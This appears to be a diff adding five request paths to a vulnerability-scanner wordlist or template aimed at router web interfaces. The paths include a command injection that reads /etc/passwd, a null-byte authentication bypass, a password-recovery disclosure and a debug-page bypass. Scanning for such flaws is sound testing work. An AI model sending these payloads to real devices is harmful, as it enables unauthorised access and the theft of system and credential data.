@@ -1,0 +1,5 @@
+/cgi-bin/;cat$IFS/etc/passwd
+/passwordrecovered.cgi?id={{rand_base(5)}}
+/currentsetting.htm
+/RST_status.htm%00currentsetting.htm
+/setup.cgi?next_file=debug.htm&x=currentsetting.htm
